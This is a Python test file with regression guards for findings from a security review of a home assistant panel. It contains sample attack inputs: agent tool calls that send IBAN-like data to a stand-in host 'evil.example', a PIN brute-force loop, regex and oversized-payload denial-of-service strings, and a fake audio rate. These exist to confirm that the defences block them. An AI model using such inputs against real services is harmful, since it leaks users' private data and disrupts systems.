"""Guards from the independent review of 11.10.2026 (pruefung/unabhaengige-pruefung-2026-10-11.md).
Each test stands for one finding; none reads the clock or the time of day."""
import asyncio
import datetime
import io
import os
import time
import unittest
import wave
import zoneinfo

from tests import helpers

helpers.start()
import agent  # noqa: E402
import answercheck  # noqa: E402
import chat  # noqa: E402
import common  # noqa: E402
import guard  # noqa: E402
import panel  # noqa: E402
import profiles  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402


def wav(rate, seconds=0.1):
    out = io.BytesIO()
    with wave.open(out, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        w.writeframes(b"\0\0" * max(1, int(rate * seconds)))
    return out.getvalue()


class LongMessage(unittest.TestCase):
    """H1: one long chat message froze the panel (quadratic regexes on the event loop)."""

    def test_smalltalk_rule_stays_linear(self):
        t = time.perf_counter()
        self.assertIsNone(chat.SMALLTALK.fullmatch("danke" + " " * 60000 + "x"))
        self.assertLess(time.perf_counter() - t, 1.0)   # was 22 s
        for s in ("danke", "Danke, Spark!", "vielen dank !", "ok", "hallo spark"):
            self.assertTrue(chat.SMALLTALK.fullmatch(s), s)

    def test_money_figures_stay_linear_and_unchanged(self):
        t = time.perf_counter()
        for s in ("1" * 8000 + " €", "123 " * 12000 + "x €", "1 € " * 5000):
            answercheck.facts(s)
        self.assertLess(time.perf_counter() - t, 1.5)   # the first alone took 2 s
        cases = {"kostet 1.234,56 €": {("m", 1234, 56)}, "12.50 euro": {("m", 12, 50)}, "€ 5,99": {("m", 5, 99)},
                 "3 € und 45,5 €": {("m", 3, 0), ("m", 45, 50)}, " 12 345 678 €": {("m", 12345678, 0)},
                 "in europa 5 leute": set(), "x" * 200 + " 12 € " + "y" * 200: {("m", 12, 0)}}
        for text, want in cases.items():
            self.assertEqual({f for f in answercheck.facts(text) if f[0] == "m"}, want, text[:30])

    def test_a_turn_takes_at_most_max_turn_chars(self):
        profile = TestClient(panel.app)
        profiles.add_user("Lang", "4455")
        self.assertEqual(profile.post("/api/profile/login", json={"name": "Lang", "pin": "4455"}).status_code, 200)
        seen = []
        real = chat._answer

        async def spy(request, turn):
            seen.append(len(turn.ask_text))
            return await real(request, turn)
        chat._answer = spy
        try:
            t = time.perf_counter()
            profile.post("/api/chat", json={"messages": [{"role": "user", "content": "danke" + " " * 200000 + "x"}]})
            self.assertLess(time.perf_counter() - t, 10)
        finally:
            chat._answer = real
        self.assertTrue(seen and max(seen) <= chat.MAX_TURN_CHARS, seen)


class AudioRate(unittest.TestCase):
    """H2: a header claiming "1 Hz" made the engines resample a tiny file to GBs."""

    def test_rates_from_headers(self):
        self.assertEqual(common.audio_rate(wav(16000)), 16000)
        self.assertEqual(common.audio_rate(wav(1, 2000)), 1)
        self.assertNotEqual(common.audio_rate_ok(wav(1, 2000)), "")
        self.assertNotEqual(common.audio_rate_ok(wav(4000)), "")
        self.assertEqual(common.audio_rate_ok(wav(48000)), "")
        self.assertEqual(common.audio_rate(b"OggS" + b"\0" * 24 + b"OpusHead" + b"\0" * 20), 48000)
        vorbis = b"OggS" + b"\0" * 24 + b"\x01vorbis" + b"\0" * 4 + b"\x01" + (3).to_bytes(4, "little") + b"\0" * 20
        self.assertNotEqual(common.audio_rate_ok(vorbis), "")
        self.assertNotEqual(common.audio_rate_ok(b"not audio at all" * 10), "")

    def test_asr_service_refuses_a_made_up_rate_before_the_engine(self):
        import asr_proxy

        async def ready(role="main"):
            return "ready", ""
        real = asr_proxy.engine_status
        asr_proxy.engine_status = ready
        try:
            c = TestClient(asr_proxy.app, client=("127.0.0.1", 1))
            key = common.load_config().get("api", {}).get("key", "")
            r = c.post("/v1/audio/transcriptions", files={"file": ("a.wav", wav(1, 2000), "audio/wav")},
                       headers={"Authorization": f"Bearer {key}"} if key else {})
            self.assertEqual(r.status_code, 415)
            self.assertIn("sample rate", r.text)
        finally:
            asr_proxy.engine_status = real

    def test_wyoming_takes_only_microphone_formats_and_bounded_events(self):
        import wyoming

        async def go(head):
            r = asyncio.StreamReader()
            r.feed_data(head)
            r.feed_eof()
            return await wyoming.read_event(r)
        with self.assertRaises(ValueError):   # "3 GB follow" is refused before anything is read
            asyncio.run(go(b'{"type": "audio-chunk", "payload_length": 3000000000}\n'))
        with self.assertRaises(ValueError):
            asyncio.run(go(b'{"type": "x", "data_length": 999999999}\n'))
        self.assertEqual(asyncio.run(go(b'{"type": "audio-chunk", "payload_length": 2}\nab'))[2], b"ab")
        from tests.test_wyoming import HEARD, run
        before = len(HEARD)
        run([("audio-start", {"rate": 1, "width": 2, "channels": 1}, b""),
             ("audio-chunk", {"rate": 1, "width": 2, "channels": 1}, b"\0" * 2000),
             ("audio-stop", {}, b"")])
        self.assertEqual(len(HEARD), before)   # nothing went to the engine


class JobsKeepPrivateDataIn(unittest.TestCase):
    """H3: after private data a job's page or search could carry it to a stranger's server."""

    def test_after_private_reading_only_job_words_and_found_addresses(self):
        server = {"id": "srv1", "name": "Notizen"}
        extra = {"mcp_a": (server, {"name": "find"}), "mcp_b": ({"id": "srv2", "name": "Andere"}, {"name": "x"})}
        counts = {"task": "Recherchiere Wärmepumpen Förderung"}
        # nothing private read yet: everything open
        self.assertEqual(agent._carries_out("read_page", {"url": "https://evil.example/?d=1"}, extra, counts), "")
        counts["private"] = {"document_search"}
        counts["seen"] = {"https://bafa.de/foerderung"}
        self.assertTrue(agent._carries_out("read_page", {"url": "https://evil.example/?d=IBAN"}, extra, counts))
        self.assertEqual(agent._carries_out("read_page", {"url": "https://bafa.de/foerderung"}, extra, counts), "")
        self.assertTrue(agent._carries_out("web_search", {"query": "IBAN DE12 3456"}, extra, counts))
        self.assertEqual(agent._carries_out("web_search", {"query": "Förderung Wärmepumpen"}, extra, counts), "")
        self.assertTrue(agent._carries_out("mcp_a", {"q": "x"}, extra, counts))   # documents read: no service
        counts["private"] = {"mcp:srv1"}
        self.assertEqual(agent._carries_out("mcp_a", {"q": "x"}, extra, counts), "")   # the same service again
        self.assertTrue(agent._carries_out("mcp_b", {"q": "x"}, extra, counts))

    def test_the_job_runner_records_what_was_read(self):
        steps, counts = [], {"all": 0, "search": 0, "page": 0, "task": "Termine"}
        uid = profiles.add_user("Jobber", "1212")
        r = asyncio.run(agent._job_tool(uid, "reminder_list", {}, {}, counts, steps))
        self.assertIn("reminder_list", counts["private"])
        r = asyncio.run(agent._job_tool(uid, "read_page", {"url": "https://evil.example/?d=x"}, {}, counts, steps))
        self.assertEqual(r, agent.CARRY_OUT)
        self.assertEqual(steps[-1]["what"], "Gesperrt: read_page")


class HousemateLockout(unittest.TestCase):
    """H4: a browser known for its own profile could guess another profile's PIN without limit."""

    def test_own_profile_does_not_lift_another_names_lock(self):
        import account
        real = account.asyncio
        account.asyncio = type("A", (), {"sleep": staticmethod(lambda s: real.sleep(0))})
        self.addCleanup(setattr, account, "asyncio", real)
        profiles.add_user("Opfer", "4711")
        profiles.add_user("Mitbewohner", "9999")
        victim = TestClient(panel.app, client=("192.0.2.50", 1))
        self.assertEqual(victim.post("/api/profile/login", json={"name": "Opfer", "pin": "4711"}).status_code, 200)
        mate = TestClient(panel.app, client=("192.0.2.50", 1))   # same address (hairpin NAT, one proxy)
        self.assertEqual(mate.post("/api/profile/login", json={"name": "Mitbewohner", "pin": "9999"}).status_code, 200)
        codes = [mate.post("/api/profile/login", json={"name": "Opfer", "pin": f"{i:04d}"}).status_code
                 for i in range(15)]
        self.assertIn(429, codes)   # was 200 × 401 in a row
        self.assertEqual(mate.post("/api/profile/login", json={"name": "Opfer", "pin": "4711"}).status_code, 429)
        # the victim's own browser still gets in
        self.assertEqual(victim.post("/api/profile/login", json={"name": "Opfer", "pin": "4711"}).status_code, 200)


class SerialForFlashing(unittest.TestCase):
    """H5: the panel's own Permissions-Policy blocked flashing the speakers over USB serial."""

    def test_serial_allowed_for_the_panel_itself(self):
        policy = TestClient(panel.app).get("/").headers.get("permissions-policy", "")
        self.assertIn("serial=(self)", policy)
        self.assertNotIn("bluetooth", policy)   # unknown to Chromium: a warning on every page


class ClockChange(unittest.TestCase):
    """H6: without a profile time zone, times after the clock change were an hour off."""

    def test_reminder_after_the_change_keeps_its_hour(self):
        real = chat._system_zone[:]
        chat._system_zone[:] = [zoneinfo.ZoneInfo("Europe/Berlin")]
        try:
            due = chat.reminder_due({"at": "2099-10-26T08:00"}, None)
            at = datetime.datetime.fromtimestamp(due / 1000, zoneinfo.ZoneInfo("Europe/Berlin"))
            self.assertEqual((at.hour, at.minute), (8, 0))
            due = chat.reminder_due({"at": "2099-07-01T08:00"}, "")
            at = datetime.datetime.fromtimestamp(due / 1000, zoneinfo.ZoneInfo("Europe/Berlin"))
            self.assertEqual((at.hour, at.minute), (8, 0))
            self.assertIsInstance(chat.user_zone(""), zoneinfo.ZoneInfo)
            self.assertEqual(chat.local_now().tzinfo, zoneinfo.ZoneInfo("Europe/Berlin"))
        finally:
            chat._system_zone[:] = real

    def test_system_zone_is_a_real_zone(self):
        self.assertTrue(hasattr(chat.system_zone(), "key") or os.environ.get("TZ", "").startswith("<"))


if __name__ == "__main__":
    unittest.main()
